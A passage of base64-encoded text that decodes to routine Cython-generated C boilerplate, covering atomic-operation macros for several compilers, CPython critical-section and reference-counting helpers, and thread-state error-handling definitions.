JfdFxuICAgICNkZWZpbmUgX19weXhfbm9uYXRvbWljX3B0cl90eXBlIHVpbnRwdHJfdFxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZCh2YWx1ZSkgc3RkOjphdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBzdGQ6Om1lbW9yeV9vcmRlcl9yZWxheGVkKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgc3RkOjphdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3FfcmVsKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgc3RkOjphdG9taWNfZmV0Y2hfc3ViX2V4cGxpY2l0KHZhbHVlLCAxLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3FfcmVsKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N1Yih2YWx1ZSwgYXJnKSBzdGQ6OmF0b21pY19mZXRjaF9zdWIodmFsdWUsIGFyZylcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZCkgc3RkOjphdG9taWNfY29tcGFyZV9leGNoYW5nZV9zdHJvbmcodmFsdWUsIGV4cGVjdGVkLCBkZXNpcmVkKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIHN0ZDo6YXRvbWljX2xvYWQodmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgc3RkOjphdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgc3RkOjptZW1vcnlfb3JkZXJfYWNxdWlyZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpIHN0ZDo6YXRvbWljX2V4Y2hhbmdlKHZhbHVlLCAoX19weXhfbm9uYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSlcbiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKVxuICAgICAgICAjcHJhZ21hIG1lc3NhZ2UgKCJVc2luZyBzdGFuZGFyZCBDKysgYXRvbWljcyIpXG4gICAgI2VsaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKVxuICAgICAgICAjd2FybmluZyAiVXNpbmcgc3RhbmRhcmQgQysrIGF0b21pY3MiXG4gICAgI2VuZGlmXG4jZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoX19HTlVDX18gPj0gNSB8fCAoX19HTlVDX18gPT0gNCAmJlxcXG4gICAgICAgICAgICAgICAgICAgIChfX0dOVUNfTUlOT1JfXyA+IDEgfHxcXFxuICAgICAgICAgICAgICAgICAgICAoX19HTlVDX01JTk9SX18gPT0gMSAmJiBfX0dOVUNfUEFUQ0hMRVZFTF9fID49IDIpKSkpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgdm9pZCpcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfYWRkKHZhbHVlLCAxKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDEpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX3N1Yih2YWx1ZSwgMSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgX19zeW5jX2ZldGNoX2FuZF9zdWIodmFsdWUsIGFyZylcbiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoX19weXhfYXRvbWljX2ludF90eXBlKiB2YWx1ZSwgX19weXhfbm9uYXRvbWljX2ludF90eXBlKiBleHBlY3RlZCwgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGRlc2lyZWQpIHtcbiAgICAgICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZCA9IF9fc3luY192YWxfY29tcGFyZV9hbmRfc3dhcCh2YWx1ZSwgKmV4cGVjdGVkLCBkZXNpcmVkKTtcbiAgICAgICAgaW50IHJlc3VsdCA9IG9sZCA9PSAqZXhwZWN0ZWQ7XG4gICAgICAgICpleHBlY3RlZCA9IG9sZDtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDApXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgX19zeW5jX2xvY2tfdGVzdF9hbmRfc2V0KHZhbHVlLCBuZXdfdmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfYWRkKHZhbHVlLCAwKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpIF9fc3luY19sb2NrX3Rlc3RfYW5kX3NldCh2YWx1ZSwgKF9fcHl4X2F0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpXG4gICAgI2lmZGVmIF9fUFlYX0RFQlVHX0FUT01JQ1NcbiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIEdOVSBhdG9taWNzIlxuICAgICNlbmRpZlxuI2VsaWYgQ1lUSE9OX0FUT01JQ1MgJiYgZGVmaW5lZChfTVNDX1ZFUilcbiAgICAjaW5jbHVkZSA8aW50cmluLmg+XG4gICAgI3VuZGVmIF9fcHl4X2F0b21pY19pbnRfdHlwZVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2ludF90eXBlIGxvbmdcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSB2b2lkKlxuICAgICN1bmRlZiBfX3B5eF9ub25hdG9taWNfaW50X3R5cGVcbiAgICAjZGVmaW5lIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBsb25nXG4gICAgI3ByYWdtYSBpbnRyaW5zaWMgKF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkLCBfSW50ZXJsb2NrZWRFeGNoYW5nZSwgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlLCBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2VQb2ludGVyLCBfSW50ZXJsb2NrZWRFeGNoYW5nZVBvaW50ZXIpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKHZhbHVlKSBfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCh2YWx1ZSwgMSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAxKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIC0xKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N1Yih2YWx1ZSwgYXJnKSBfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCh2YWx1ZSwgLWFyZylcbiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoX19weXhfYXRvbWljX2ludF90eXBlKiB2YWx1ZSwgX19weXhfbm9uYXRvbWljX2ludF90eXBlKiBleHBlY3RlZCwgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGRlc2lyZWQpIHtcbiAgICAgICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZCA9IF9JbnRlcmxvY2tlZENvbXBhcmVFeGNoYW5nZSh2YWx1ZSwgZGVzaXJlZCwgKmV4cGVjdGVkKTtcbiAgICAgICAgaW50IHJlc3VsdCA9IG9sZCA9PSAqZXhwZWN0ZWQ7XG4gICAgICAgICpleHBlY3RlZCA9IG9sZDtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIDApXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCh2YWx1ZSkgKih2b2lkICogdm9sYXRpbGUgKil2YWx1ZVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2VQb2ludGVyKHZhbHVlLCAwLCAwKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VQb2ludGVyKHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSlcbiAgICAjaWZkZWYgX19QWVhfREVCVUdfQVRPTUlDU1xuICAgICAgICAjcHJhZ21hIG1lc3NhZ2UgKCJVc2luZyBNU1ZDIGF0b21pY3MiKVxuICAgICNlbmRpZlxuI2Vsc2VcbiAgICAjdW5kZWYgQ1lUSE9OX0FUT01JQ1NcbiAgICAjZGVmaW5lIENZVEhPTl9BVE9NSUNTIDBcbiAgICAjaWZkZWYgX19QWVhfREVCVUdfQVRPTUlDU1xuICAgICAgICAjd2FybmluZyAiTm90IHVzaW5nIGF0b21pY3MiXG4gICAgI2VuZGlmXG4jZW5kaWZcbiNpZiBDWVRIT05fQVRPTUlDU1xuICAgICNkZWZpbmUgX19weXhfYWRkX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXFxcbiAgICAgICAgICAgICBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKF9fcHl4X2dldF9zbGljZV9jb3VudF9wb2ludGVyKG1lbXZpZXcpKVxuICAgICNkZWZpbmUgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXFxcbiAgICAgICAgICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoX19weXhfZ2V0X3NsaWNlX2NvdW50X3BvaW50ZXIobWVtdmlldykpXG4jZWxzZVxuICAgICNkZWZpbmUgX19weXhfYWRkX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXFxcbiAgICAgICAgICAgIF9fcHl4X2FkZF9hY3F1aXNpdGlvbl9jb3VudF9sb2NrZWQoX19weXhfZ2V0X3NsaWNlX2NvdW50X3BvaW50ZXIobWVtdmlldyksIG1lbXZpZXctPmxvY2spXG4gICAgI2RlZmluZSBfX3B5eF9zdWJfYWNxdWlzaXRpb25fY291bnQobWVtdmlldylcXFxuICAgICAgICAgICAgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50X2xvY2tlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSwgbWVtdmlldy0+bG9jaylcbiNlbmRpZlxuXG5cbiNpbmNsdWRlIDxzdHJ1Y3RtZW1iZXIuaD5cblxuXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uIHZvaWQqXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uMiB2b2lkKlxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9CZWdpbjEoY3MsIGFyZykgKHZvaWQpY3NcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4yKGNzLCBhcmcxLCBhcmcyKSAodm9pZCljc1xuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9FbmQxKGNzKVxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9FbmQyKGNzKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb24gUHlDcml0aWNhbFNlY3Rpb25cbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb24yIFB5Q3JpdGljYWxTZWN0aW9uMlxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9CZWdpbjEgUHlDcml0aWNhbFNlY3Rpb25fQmVnaW5cbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4yIFB5Q3JpdGljYWxTZWN0aW9uMl9CZWdpblxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9FbmQxIFB5Q3JpdGljYWxTZWN0aW9uX0VuZFxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9FbmQyIFB5Q3JpdGljYWxTZWN0aW9uMl9FbmRcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4jZGVmaW5lIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04obykge1xuI2RlZmluZSBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpIH1cbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04gUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTlxuI2RlZmluZSBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTiBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTlxuI2VuZGlmXG5cblxuXG5cblxuXG5zdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHI7XG5zdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndztcbnN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHI7XG5cblxuc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByIHtcbiAgUHlPYmplY3RfSEVBRFxuICBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfXztcbn07XG5cblxuXG5zdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndyB7XG4gIFB5T2JqZWN0X0hFQURcbiAgUHlPYmplY3QgKl9fcHl4X3ZfbGV0dGVycztcbn07XG5cblxuXG5zdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIHtcbiAgUHlPYmplY3RfSEVBRFxuICBzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndyAqX19weXhfb3V0ZXJfc2NvcGU7XG4gIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wO1xuICBQeU9iamVjdCAqX19weXhfdl9fO1xufTtcblxuXG5cblxuXG4jaWZuZGVmIENZVEhPTl9SRUZOQU5OWVxuICAjZGVmaW5lIENZVEhPTl9SRUZOQU5OWSAwXG4jZW5kaWZcbiNpZiBDWVRIT05fUkVGTkFOTllcbiAgdHlwZWRlZiBzdHJ1Y3Qge1xuICAgIHZvaWQgKCpJTkNSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpO1xuICAgIHZvaWQgKCpERUNSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpO1xuICAgIHZvaWQgKCpHT1RSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpO1xuICAgIHZvaWQgKCpHSVZFUkVGKSh2b2lkKiwgUHlPYmplY3QqLCBQeV9zc2l6ZV90KTtcbiAgICB2b2lkKiAoKlNldHVwQ29udGV4dCkoY29uc3QgY2hhciosIFB5X3NzaXplX3QsIGNvbnN0IGNoYXIqKTtcbiAgICB2b2lkICgqRmluaXNoQ29udGV4dCkodm9pZCoqKTtcbiAgfSBfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdDtcbiAgc3RhdGljIF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICpfX1B5eF9SZWZOYW5ueSA9IE5VTEw7XG4gIHN0YXRpYyBfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoY29uc3QgY2hhciAqbW9kbmFtZSk7XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMgdm9pZCAqX19weXhfcmVmbmFubnkgPSBOVUxMO1xuICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KG5hbWUsIGFjcXVpcmVfZ2lsKVxcXG4gICAgICAgICAgaWYgKGFjcXVpcmVfZ2lsKSB7XFxcbiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcXFxuICAgICAgICAgICAgICBfX3B5eF9yZWZuYW5ueSA9IF9fUHl4X1JlZk5hbm55LT5TZXR1cENvbnRleHQoKG5hbWUpLCAoX19MSU5FX18pLCAoX19GSUxFX18pKTtcXFxuICAgICAgICAgICAgICBQeUdJTFN0YXRlX1JlbGVhc2UoX19weXhfZ2lsc3RhdGVfc2F2ZSk7XFxcbiAgICAgICAgICB9IGVsc2Uge1xcXG4gICAgICAgICAgICAgIF9fcHl4X3JlZm5hbm55ID0gX19QeXhfUmVmTmFubnktPlNldHVwQ29udGV4dCgobmFtZSksIChfX0xJTkVfXyksIChfX0ZJTEVfXykpO1xcXG4gICAgICAgICAgfVxuICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dE5vZ2lsKCkge1xcXG4gICAgICAgICAgICAgIFB5R0lMU3RhdGVfU1RBVEUgX19weXhfZ2lsc3RhdGVfc2F2ZSA9IFB5R0lMU3RhdGVfRW5zdXJlKCk7XFxcbiAgICAgICAgICAgICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XFxcbiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9SZWxlYXNlKF9fcHl4X2dpbHN0YXRlX3NhdmUpO1xcXG4gICAgICAgICAgfVxuICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dE5vZ2lsKCkge1xcXG4gICAgICAgICAgICAgIFB5R0lMU3RhdGVfU1RBVEUgX19weXhfZ2lsc3RhdGVfc2F2ZSA9IFB5R0lMU3RhdGVfRW5zdXJlKCk7XFxcbiAgICAgICAgICAgICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XFxcbiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9SZWxlYXNlKF9fcHl4X2dpbHN0YXRlX3NhdmUpO1xcXG4gICAgICAgICAgfVxuICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpXFxcbiAgICAgICAgICBfX1B5eF9SZWZOYW5ueS0+RmluaXNoQ29udGV4dCgmX19weXhfcmVmbmFubnkpXG4gICNkZWZpbmUgX19QeXhfSU5DUkVGKHIpICBfX1B5eF9SZWZOYW5ueS0+SU5DUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpXG4gICNkZWZpbmUgX19QeXhfREVDUkVGKHIpICBfX1B5eF9SZWZOYW5ueS0+REVDUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpXG4gICNkZWZpbmUgX19QeXhfR09UUkVGKHIpICBfX1B5eF9SZWZOYW5ueS0+R09UUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpXG4gICNkZWZpbmUgX19QeXhfR0lWRVJFRihyKSBfX1B5eF9SZWZOYW5ueS0+R0lWRVJFRihfX3B5eF9yZWZuYW5ueSwgKFB5T2JqZWN0ICopKHIpLCAoX19MSU5FX18pKVxuICAjZGVmaW5lIF9fUHl4X1hJTkNSRUYocikgIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9JTkNSRUYocik7IH19IHdoaWxlKDApXG4gICNkZWZpbmUgX19QeXhfWERFQ1JFRihyKSAgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0RFQ1JFRihyKTsgfX0gd2hpbGUoMClcbiAgI2RlZmluZSBfX1B5eF9YR09UUkVGKHIpICBkbyB7IGlmKChyKSA9PSBOVUxMKTsgZWxzZSB7X19QeXhfR09UUkVGKHIpOyB9fSB3aGlsZSgwKVxuICAjZGVmaW5lIF9fUHl4X1hHSVZFUkVGKHIpIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9HSVZFUkVGKHIpO319IHdoaWxlKDApXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQobmFtZSwgYWNxdWlyZV9naWwpXG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0Tm9naWwoKVxuICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpXG4gICNkZWZpbmUgX19QeXhfSU5DUkVGKHIpIFB5X0lOQ1JFRihyKVxuICAjZGVmaW5lIF9fUHl4X0RFQ1JFRihyKSBQeV9ERUNSRUYocilcbiAgI2RlZmluZSBfX1B5eF9HT1RSRUYocilcbiAgI2RlZmluZSBfX1B5eF9HSVZFUkVGKHIpXG4gICNkZWZpbmUgX19QeXhfWElOQ1JFRihyKSBQeV9YSU5DUkVGKHIpXG4gICNkZWZpbmUgX19QeXhfWERFQ1JFRihyKSBQeV9YREVDUkVGKHIpXG4gICNkZWZpbmUgX19QeXhfWEdPVFJFRihyKVxuICAjZGVmaW5lIF9fUHl4X1hHSVZFUkVGKHIpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlfWERFQ1JFRl9TRVQociwgdikgZG8ge1xcXG4gICAgICAgIFB5T2JqZWN0ICp0bXAgPSAoUHlPYmplY3QgKikgcjtcXFxuICAgICAgICByID0gdjsgUHlfWERFQ1JFRih0bXApO1xcXG4gICAgfSB3aGlsZSAoMClcbiNkZWZpbmUgX19QeXhfWERFQ1JFRl9TRVQociwgdikgZG8ge1xcXG4gICAgICAgIFB5T2JqZWN0ICp0bXAgPSAoUHlPYmplY3QgKikgcjtcXFxuICAgICAgICByID0gdjsgX19QeXhfWERFQ1JFRih0bXApO1xcXG4gICAgfSB3aGlsZSAoMClcbiNkZWZpbmUgX19QeXhfREVDUkVGX1NFVChyLCB2KSBkbyB7XFxcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IChQeU9iamVjdCAqKSByO1xcXG4gICAgICAgIHIgPSB2OyBfX1B5eF9ERUNSRUYodG1wKTtcXFxuICAgIH0gd2hpbGUgKDApXG4jZGVmaW5lIF9fUHl4X0NMRUFSKHIpICAgIGRvIHsgUHlPYmplY3QqIHRtcCA9ICgoUHlPYmplY3QqKShyKSk7IHIgPSBOVUxMOyBfX1B5eF9ERUNSRUYodG1wKTt9IHdoaWxlKDApXG4jZGVmaW5lIF9fUHl4X1hDTEVBUihyKSAgIGRvIHsgaWYoKHIpICE9IE5VTEwpIHtQeU9iamVjdCogdG1wID0gKChQeU9iamVjdCopKHIpKTsgciA9IE5VTEw7IF9fUHl4X0RFQ1JFRih0bXApO319IHdoaWxlKDApXG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuI2RlZmluZSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKGVycikgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc0luU3RhdGUoX19weXhfdHN0YXRlLCBlcnIpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc0luU3RhdGUoUHlUaHJlYWRTdGF0ZSogdHN0YXRlLCBQeU9iamVjdCogZXJyKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoZXJyKSAgUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhlcnIpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZSAgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlO1xuI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbiAgX19weXhfdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50O1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTZcbiNkZWZpbmUgX19QeXhfUHlFcnJfT2NjdXJyZWQoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gIT0gTlVMTClcbiNkZWZpbmUgX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPyAoUHlPYmplY3QqKSBQeV9UWVBFKF9fcHl4X3RzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24pIDogKFB5T2JqZWN0KikgTlVMTClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RXJyX09jY3VycmVkKCkgIChfX3B5eF90c3RhdGUtPmN1cmV4Y190eXBlICE9IE5VTEwpXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCkgIChfX3B5eF90c3RhdGUtPmN1cmV4Y190eXBlKVxuI2VuZGlmXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiNkZWZpbmUgX19QeXhfUHlFcnJfT2NjdXJyZWQoKSAgKFB5RXJyX09jY3VycmVkKCkgIT0gTlVMTClcbiNkZWZpbmUgX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSAgUHlFcnJfT2NjdXJyZWQoKVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuI2RlZmluZSBfX1B5eF9QeUVycl9DbGVhcigpIF9fUHl4X0VyclJlc3RvcmUoTlVMTCwgTlVMTCwgTlVMTClcbiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZSh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZShQeVRocmVhZFN0YXRlX0dFVCgpLCB0eXBlLCB2YWx1ZSwgdGIpXG4jZGVmaW5lIF9fUHl4X0VyckZldGNoV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKFB5VGhyZWFkU3RhdGVfR0VUKCksIHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZShfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0Yilcb